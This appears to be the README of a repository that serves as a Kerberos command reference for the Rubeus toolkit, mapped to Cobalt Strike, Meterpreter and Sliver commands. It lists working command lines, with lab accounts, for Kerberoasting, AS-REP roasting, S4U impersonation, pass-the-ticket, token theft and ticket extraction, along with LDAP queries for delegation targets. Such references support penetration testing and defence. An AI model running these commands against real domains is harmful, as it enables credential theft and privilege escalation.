# Rubeus — Kerberos Reference

**English** · [Version française](README.md) · [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

## Contents

01 - [Overview](#section-01)  
02 - [Command inventory](#section-02)  
03 - [Syntax and execution](#section-03)  
04 - [Ticket inspection](#section-04)  
05 - [Requesting a TGT](#section-05)  
06 - [Requesting a TGS](#section-06)  
07 - [Renewal](#section-07)  
08 - [Kerberoasting](#section-08)  
09 - [AS-REP Roasting](#section-09)  
10 - [Constrained Delegation / S4U](#section-10)  
11 - [Pass-the-Ticket](#section-11)  
12 - [CreateNetOnly and tokens](#section-12)  
13 - [Ticket monitoring and extraction](#section-13)  
14 - [Golden / Silver / Diamond](#section-14)  
15 - [Other features](#section-15)  
16 - [Common options](#section-16)  
17 - [Troubleshooting](#section-17)  
18 - [Unconstrained Delegation](#section-18)  
19 - [Service Name Substitution](#section-19)  
20 - [Resource-Based Constrained Delegation](#section-20)  
21 - [TGT Delegation / Forwardable](#section-21)  
22 - [Protocol Transition / Bronze Bit / PKINIT](#section-22)  
23 - [Understanding userAccountControl bitmasks](#section-23)  
24 - [Cobalt Strike / Meterpreter / Sliver equivalents](#section-24)  
25 - [Sources and verification](#section-25)  
26 - [Base64 to .kirbi (PowerShell)](#section-26)  

<a id="section-01"></a>
## 01 - Overview

Rubeus is a .NET toolkit for Kerberos and Active Directory. C2 frameworks may offer ticket handling, but do not always implement all Rubeus functionality.

Rubeus is a Kerberos toolkit for Active Directory. Its features span TGT/TGS requests, delegation, ticket inspection, roasting, and ticket handling. The commands below use fictional accounts and hosts.


[↑ Back to contents](#contents)

---


<a id="section-02"></a>
## 02 - Command inventory

Rubeus covers TGT/TGS requests, ticket caches, password auditing, S4U delegation, ticket conversion and advanced authentication workflows.

The command inventory covers Rubeus action names and their purposes. Availability and exact flags may differ among versions.


[↑ Back to contents](#contents)

---


<a id="section-03"></a>
## 03 - Syntax and execution

Use `Rubeus.exe <action> [options]` on Windows. Check built-in help for the installed build. Cobalt Strike `execute-assembly` can invoke compatible .NET tools.

Run Rubeus.exe ACTION /option:value in a Windows environment. Beacon execute-assembly, Meterpreter and Sliver have different execution models.

**Rubeus · Aide**

```powershell
Rubeus.exe
Rubeus.exe help
Rubeus.exe asktgt /?
```

**Cobalt Strike · Assembly**

```text
execute-assembly C:\Tools\Rubeus.exe klist
```

**Sliver · Assembly**

```text
execute-assembly C:\Tools\Rubeus.exe klist
```

**Meterpreter · Depuis un shell Windows**

```text
shell
C:\Tools\Rubeus.exe klist
```


[↑ Back to contents](#contents)

---


<a id="section-04"></a>
## 04 - Ticket inspection

A TGT targets `krbtgt`, whereas a TGS targets a service principal name (SPN). A LUID identifies a Windows logon session. `klist`, `triage` and `describe` inspect tickets.

klist, triage, and describe inspect Kerberos tickets. A ticket is scoped to a logon session and grants only the service access encoded by Kerberos and the user permissions.

**Rubeus · Lister**

```powershell
Rubeus.exe klist
Rubeus.exe triage
Rubeus.exe currentluid
Rubeus.exe logonsession
```

**Rubeus · Décrire**

```powershell
Rubeus.exe describe /ticket:C:\Lab\service.kirbi
```

**Cobalt Strike · Inspection**

```text
shell klist
```

**Meterpreter · Kiwi**

```text
load kiwi
kerberos_ticket_list
```

**Sliver · Inspection système**

```text
execute klist
```


[↑ Back to contents](#contents)

---


<a id="section-05"></a>
## 05 - Requesting a TGT

`asktgt` requests a Ticket Granting Ticket using an authorized password, Kerberos key or certificate and the AS-REQ/AS-REP exchange.

asktgt requests a Ticket Granting Ticket using a known account secret or an eligible certificate. A TGT is used to request TGS tickets.

**Rubeus · Mot de passe de laboratoire**

```powershell
Rubeus.exe asktgt /user:labuser /password:LabPassword123! /domain:lab.local /dc:dc01.lab.local /nowrap
```

**Rubeus · Certificat (syntaxe à adapter)**

```powershell
Rubeus.exe asktgt /user:labuser /domain:lab.local /certificate:C:\Lab\user.pfx
```

**Metasploit Framework · Module**

```text
use auxiliary/admin/kerberos/get_ticket
show options
```


[↑ Back to contents](#contents)

---


<a id="section-06"></a>
## 06 - Requesting a TGS

`asktgs` requests a service ticket for an SPN with an existing valid TGT. The ticket does not grant permissions beyond the identity's existing authorizations.

asktgs requests a service ticket for an SPN using an existing TGT. SPN names and service encryption keys matter.

**Rubeus · Service HTTP**

```powershell
Rubeus.exe asktgs /ticket:C:\Lab\user.kirbi /service:HTTP/web01.lab.local
```

**Windows · Ticket de session**

```text
klist
```


[↑ Back to contents](#contents)

---


<a id="section-07"></a>
## 07 - Renewal

`renew` can renew an eligible TGT while its renewal lifetime is still valid.

renew requests a replacement TGT within its permitted renewable lifetime. Expired renewal windows cannot be bypassed by the command.

**Rubeus · Renew**

```powershell
Rubeus.exe renew /ticket:C:\Lab\user.kirbi
```


[↑ Back to contents](#contents)

---


<a id="section-08"></a>
## 08 - Kerberoasting

Kerberoasting examines encrypted service tickets for SPN-bearing service accounts to assess password strength; managed long passwords and gMSAs reduce exposure.

Kerberoasting audits password strength for accounts with registered SPNs. Its output can be used for offline password auditing; weak service-account secrets are the primary risk.

**Rubeus · Inventaire**

```powershell
Rubeus.exe kerberoast /stats
```

**Rubeus · Compte de test**

```powershell
Rubeus.exe kerberoast /user:svc_sql /domain:lab.local /nowrap
```

**Rubeus · Export**

```powershell
Rubeus.exe kerberoast /outfile:kerberoast.txt
```


[↑ Back to contents](#contents)

---


<a id="section-09"></a>
## 09 - AS-REP Roasting

AS-REP Roasting concerns accounts with `DONT_REQ_PREAUTH` set. Their encrypted AS-REP material may be assessed offline.

AS-REP roasting concerns accounts where Kerberos preauthentication is not required. Audit such configurations and enforce appropriate preauthentication.

**Rubeus · Repérage**

```powershell
Rubeus.exe preauthscan /users:C:\Lab\users.txt /domain:lab.local
```

**Rubeus · Compte de test**

```powershell
Rubeus.exe asreproast /user:labuser /domain:lab.local /format:hashcat
```

**Rubeus · Export**

```powershell
Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat
```


[↑ Back to contents](#contents)

---


<a id="section-10"></a>
## 10 - Constrained Delegation / S4U

`S4U2self` requests a ticket to a service on behalf of a user; `S4U2proxy` delegates to an allowed backend SPN. Classic KCD uses `msDS-AllowedToDelegateTo`, while RBCD uses `msDS-AllowedToActOnBehalfOfOtherIdentity`.

S4U2self issues a service ticket to the front-end service on behalf of a user; S4U2proxy requests a second service ticket to a delegated target. Classic KCD depends on msDS-AllowedToDelegateTo.

**Rubeus · Avec transition**

```powershell
Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<TGT_BASE64> /impersonateuser:Administrator /nowrap
```

**Rubeus · Sans transition**

```powershell
Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<TGT_BASE64> /tgs:<TGS_BASE64> /nowrap
```

**LDAP · Détection des machines délégantes**

```text
ldapsearch "(&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))" --attributes samAccountName,msDS-AllowedToDelegateTo
```

**PowerShell · Flag Protocol Transition**

```powershell
[System.Convert]::ToBoolean(16781312 -band 16777216)
```


[↑ Back to contents](#contents)

---


<a id="section-11"></a>
## 11 - Pass-the-Ticket

Pass-the-Ticket imports a Kerberos ticket into a session. The target service, ticket lifetime and user permissions continue to apply.

Pass-the-Ticket imports an existing Kerberos ticket into a logon session. Correct session, SPN, lifetime and privileges are required.

**Rubeus · Import**

```powershell
Rubeus.exe ptt /ticket:C:\Lab\user.kirbi
```

**Cobalt Strike · Import**

```text
kerberos_ticket_use C:\Lab\user.kirbi
```

**Meterpreter · Kiwi**

```text
load kiwi
kerberos_ticket_use C:\Lab\user.kirbi
```

**Sliver · Via Rubeus**

```text
execute-assembly C:\Tools\Rubeus.exe ptt /ticket:C:\Lab\user.kirbi
```


[↑ Back to contents](#contents)

---


<a id="section-12"></a>
## 12 - CreateNetOnly and tokens

`createnetonly` creates a NewCredentials (`LOGON_TYPE 9`) process with a separate network logon session. Cobalt Strike `steal_token` borrows that local process token; it does not extract the remote user's original token.

createnetonly creates a LOGON_TYPE 9 process and can load a ticket for outbound network authentication. steal_token in Beacon borrows the token of that newly created process, not the original domain user token.

**Rubeus · CreateNetOnly**

```powershell
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:<TGS_BASE64>
```

**Cobalt Strike · Token du PID**

```text
ps
steal_token 2080
getuid
rev2self
```

**Meterpreter · Token du PID**

```text
ps
steal_token 2080
getuid
rev2self
```

**Sliver · Identité / token**

```text
ps
impersonate CONTOSO\dyork
rev2self
```


[↑ Back to contents](#contents)

---


<a id="section-13"></a>
## 13 - Ticket monitoring and extraction

`dump`, `monitor` and `harvest` can access sensitive Kerberos tickets where privileges permit. Treat exported tickets as authentication secrets.

dump, harvest and monitor inspect or collect tickets under appropriate privileges. Tickets are sensitive authentication material.

**Rubeus · Triage**

```powershell
Rubeus.exe triage
```

**Rubeus · Tickets disponibles**

```powershell
Rubeus.exe klist
```

**Meterpreter · Kiwi**

```text
load kiwi
kerberos_ticket_list
```


[↑ Back to contents](#contents)

---


<a id="section-14"></a>
## 14 - Golden / Silver / Diamond

Golden Tickets concern forged TGTs, Silver Tickets forged service tickets and Diamond Tickets modified legitimate TGTs. Modern PAC validation may limit older techniques.

Golden, Silver and Diamond tickets differ in required cryptographic material and target scope. Modern PAC verification and security patches may restrict effectiveness.


[↑ Back to contents](#contents)

---


<a id="section-15"></a>
## 15 - Other features

`hash`, `changepw`, `tgssub`, `brute` and `spray` offer additional Kerberos workflows. Password testing can cause account lockouts.

Additional helpers include password changes, ticket transformations, account testing, and Kerberos key derivation.

**Rubeus · Hash de test**

```powershell
Rubeus.exe hash /password:LabPassword123! /user:labuser /domain:lab.local
```


[↑ Back to contents](#contents)

---


<a id="section-16"></a>
## 16 - Common options

Common parameters include `/user`, `/domain`, `/dc`, `/ticket`, `/tgs`, `/service`, `/outfile`, `/nowrap`, `/ptt`, `/enctype`, `/certificate`, `/luid` and LDAP options; check per-action support.

Shared command flags vary by action. Consult the help for your installed Rubeus build.


[↑ Back to contents](#contents)

---


<a id="section-17"></a>
## 17 - Troubleshooting

`KDC_ERR_BADOPTION` may indicate invalid ticket options or delegation conditions; `KRB_AP_ERR_SKEW` indicates time drift; `KRB_AP_ERR_MODIFIED` often indicates ticket key/SPN mismatch.

Common Kerberos errors indicate incorrect options, unknown SPNs, time skew, invalid authentication data or missing access rights.


[↑ Back to contents](#contents)

---


<a id="section-18"></a>
## 18 - Unconstrained Delegation

A service marked `TRUSTED_FOR_DELEGATION` (524288, 0x80000) can receive forwarded TGTs when Kerberos policy allows. This does not mean it automatically holds every TGT in the domain.

A front-end service trusted for unconstrained delegation can receive a forwarded user TGT when Kerberos policy allows. The TRUSTED_FOR_DELEGATION flag has value 524288 (0x80000). Inspect the domain configuration and available tickets. Protected Users and accounts marked as non-delegable restrict this behavior.

**LDAP · Cobalt Strike**

```text
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName,userAccountControl
```

**PowerShell · Active Directory**

```powershell
Get-ADComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -Properties userAccountControl | Select Name,userAccountControl
```

**Rubeus · Inspection des tickets**

```powershell
Rubeus.exe triage
Rubeus.exe klist
```

**Rubeus · Aide des fonctions d’inspection**

```powershell
Rubeus.exe dump /?
Rubeus.exe monitor /?
```


[↑ Back to contents](#contents)

---


<a id="section-19"></a>
## 19 - Service Name Substitution

`tgssub` and S4U `/altservice` can change the service class in ticket representations under specific conditions. Host keys, SPN semantics and permissions still constrain actual access.

Service Name Substitution changes the service-name field in an existing service ticket. Rubeus tgssub modifies an obtained TGS; /altservice changes the service label during S4U processing. The target must still accept the ticket and relevant service key; substitution does not grant new Active Directory permissions.

**Rubeus · tgssub**

```powershell
Rubeus.exe tgssub /ticket:C:\Kerberos\service.kirbi /altservice:cifs /outfile:C:\Kerberos\service-cifs.kirbi
```

**Rubeus · S4U et altservice**

```powershell
Rubeus.exe s4u /user:lon-ws-1$ /ticket:<TGT_BASE64> /msdsspn:ldap/lon-fs-1 /impersonateuser:labuser /altservice:cifs /nowrap
```

**Cobalt Strike · Charger le ticket**

```text
kerberos_ticket_use C:\Kerberos\service-cifs.kirbi
```


[↑ Back to contents](#contents)

---


<a id="section-20"></a>
## 20 - Resource-Based Constrained Delegation

RBCD is authorized on the target resource via `msDS-AllowedToActOnBehalfOfOtherIdentity`; classic constrained delegation grants a front-end principal permission to selected SPNs.

RBCD is configured on the target resource through msDS-AllowedToActOnBehalfOfOtherIdentity. This differs from classic constrained delegation using msDS-AllowedToDelegateTo on the delegating principal. Rubeus supports the S4U protocol exchange, but does not automatically configure the required Active Directory permissions.

**PowerShell · Examiner RBCD**

```powershell
Get-ADComputer FS01 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select Name,msDS-AllowedToActOnBehalfOfOtherIdentity
```

**Rubeus · Vérifier S4U**

```powershell
Rubeus.exe s4u /?
```

**Rubeus · Examiner les tickets produits**

```powershell
Rubeus.exe describe /ticket:C:\Kerberos\service.kirbi
```


[↑ Back to contents](#contents)

---


<a id="section-21"></a>
## 21 - TGT Delegation / Forwardable

A delegated TGT and a TGS are different tickets. The `forwardable`, `forwarded` and `renewable` flags have different meanings and interact with domain restrictions.

A delegated TGT is not a TGS. Forwardable and forwarded flags influence delegation behavior, subject to domain policy and account protections. Rubeus tgtdeleg is distinct from its ticket listing commands.

**Rubeus · Inspection détaillée**

```powershell
Rubeus.exe describe /ticket:C:\Kerberos\user.kirbi
```

**Rubeus · Aide delegation**

```powershell
Rubeus.exe tgtdeleg /?
```

**PowerShell · Comptes non délégables**

```powershell
Get-ADUser -Filter * -Properties AccountNotDelegated | Where-Object AccountNotDelegated | Select SamAccountName
```


[↑ Back to contents](#contents)

---


<a id="section-22"></a>
## 22 - Protocol Transition / Bronze Bit / PKINIT

Protocol transition relies on `TRUSTED_TO_AUTH_FOR_DELEGATION` (16777216). Bronze Bit (CVE-2020-17049) is a historical patched vulnerability. PKINIT uses certificates for initial authentication.

Protocol transition uses TRUSTED_TO_AUTH_FOR_DELEGATION (16777216 / 0x1000000). Bronze Bit (CVE-2020-17049) is a historical attack affected by Microsoft KDC fixes. PKINIT, referrals and cross-domain delegation depend on certificate support and trust topology.

**Rubeus · S4U (aide)**

```powershell
Rubeus.exe s4u /?
```

**Rubeus · PKINIT (aide)**

```powershell
Rubeus.exe asktgt /?
```


[↑ Back to contents](#contents)

---


<a id="section-23"></a>
## 23 - Understanding userAccountControl bitmasks

The left operand (`16781312`) is the account's actual `userAccountControl` value, read from AD. Replace it for every account. The right operand (`16777216`) is the fixed mask `TRUSTED_TO_AUTH_FOR_DELEGATION`. `-band` performs bitwise AND, **not equality**. It returns a nonzero number when the bit is set.

The left operand (16781312) is the real userAccountControl value read from Active Directory and must be replaced with the value of the account being checked. The right operand (16777216) is the fixed bitmask for TRUSTED_TO_AUTH_FOR_DELEGATION. PowerShell -band computes bitwise AND, not equality. 16781312 -band 16777216 is nonzero, thus True; 4096 -band 16777216 is zero, thus False.

**PowerShell · Valeur fournie par AD**

```powershell
$uac = (Get-ADComputer -Identity "LON-WS-1" -Properties userAccountControl).userAccountControl
$mask = 16777216  # TRUSTED_TO_AUTH_FOR_DELEGATION
[bool]($uac -band $mask)
```

**PowerShell · Exemple chiffré**

```powershell
[System.Convert]::ToBoolean(16781312 -band 16777216)  # True
[System.Convert]::ToBoolean(4096 -band 16777216)      # False
```

**Cobalt Strike · Lire le UAC**

```text
ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
```


[↑ Back to contents](#contents)

---


<a id="section-24"></a>
## 24 - Cobalt Strike / Meterpreter / Sliver equivalents

Comparisons refer to operational effects, not identical APIs. Native C2 commands, modules/extensions and execution of Rubeus through a C2 are different integration methods.

Equivalent functionality across Cobalt Strike, Meterpreter and Sliver is not always native. Check extensions and verify command syntax against the installed build.

| Action | Cobalt Strike | Meterpreter / Metasploit | Sliver | Remarque |
| --- | --- | --- | --- | --- |
| Exécuter une assembly .NET | execute-assembly C:\Tools\Rubeus.exe klist | shell puis exécution de Rubeus.exe (pas un équivalent mémoire natif) | execute-assembly C:\Tools\Rubeus.exe klist | Exécution de Rubeus, pas équivalence Kerberos native |
| Lister les tickets | shell klist | load kiwi → kerberos_ticket_list | execute klist | Comparable pour inspection, visibilité variable |
| Importer un ticket .kirbi | kerberos_ticket_use C:\Lab\user.kirbi | load kiwi → kerberos_ticket_use C:\Lab\user.kirbi | execute-assembly Rubeus.exe ptt /ticket:... | Sliver : passe par Rubeus, pas commande native certifiée ici |
| Purger les tickets | kerberos_ticket_purge | load kiwi → kerberos_ticket_purge | execute klist purge | Sliver appelle l’outil Windows ; selon session |
| Emprunter un token de processus | steal_token <PID> | steal_token <PID> | impersonate <DOMAINE\utilisateur> | Sliver utilise ici une identité connue, pas un PID : pas strictement équivalent |
| Revenir au token initial | rev2self | rev2self | rev2self | Fonction similaire |
| Créer un token avec mot de passe | make_token DOMAINE\user motdepasse | Pas d’équivalent direct natif établi | make-token DOMAINE\user motdepasse | Même idée de contexte réseau, implémentations distinctes |
| S4U2self / S4U2proxy | execute-assembly Rubeus.exe s4u ... | Rubeus via shell ou module externe | execute-assembly Rubeus.exe s4u ... | Pas de commande native S4U confirmée dans ces C2 |
| Demander TGT / TGS | execute-assembly Rubeus.exe asktgt/asktgs ... | Modules Kerberos Metasploit (msfconsole) | execute-assembly Rubeus.exe asktgt/asktgs ... | Metasploit : pas une commande Meterpreter simple |
| Kerberoasting / AS-REP | execute-assembly Rubeus.exe kerberoast/asreproast | Modules auxiliaires Metasploit ou Rubeus externe | execute-assembly Rubeus.exe kerberoast/asreproast | Équivalence fonctionnelle dépendante des modules |
| Golden Ticket | Fonctions Kerberos/mimikatz selon version | load kiwi → golden_ticket_create (versions compatibles) | Pas d’équivalent natif confirmé | Requiert matériel cryptographique hautement sensible |
| Inspecter fichier ticket | Rubeus describe via execute-assembly | auxiliary/admin/kerberos/inspect_ticket (msfconsole) | Rubeus describe via execute-assembly | Metasploit : module console, pas Meterpreter |


[↑ Back to contents](#contents)

---


<a id="section-25"></a>
## 25 - Sources and verification

Check the official tools and current installed versions for the exact commands and parameters.

Use the upstream GhostPack/Rubeus documentation and tool-specific manuals to verify the command set.

- [Rubeus — dépôt officiel ↗](https://github.com/GhostPack/Rubeus)
- [Cobalt Strike — Running Commands ↗](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/review/userguide/content/topics/post-exploitation_running-commands.htm)
- [Cobalt Strike — Trust Relationships ↗](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_trust-relationships.htm)
- [Metasploit — Kiwi commands ↗](https://docs.metasploit.com/api/Rex/Post/Meterpreter/Ui/Console/CommandDispatcher/Kiwi.html)
- [Metasploit — Tickets ↗](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/inspect_ticket.html)
- [Sliver — Aliases and Extensions ↗](https://sliver.sh/docs/?name=Aliases+and+Extensions)

[↑ Back to contents](#contents)

---


<a id="section-26"></a>
## 26 - Base64 to .kirbi (PowerShell)

GitHub Markdown cannot run the interactive HTML generator. Replace the Base64 placeholder and output path below, then run this PowerShell snippet locally. Never commit a real ticket or ticket-bearing script.

```powershell
$ticket = @'
PASTE_BASE64_TICKET_HERE
'@
$path = 'C:\Wanted\Path\ticket.kirbi'
$bytes = [Convert]::FromBase64String(($ticket -replace '\s', ''))
$folder = Split-Path -Parent $path
if ($folder -and -not (Test-Path -LiteralPath $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}
[IO.File]::WriteAllBytes($path, $bytes)
```


[↑ Back to contents](#contents)

---
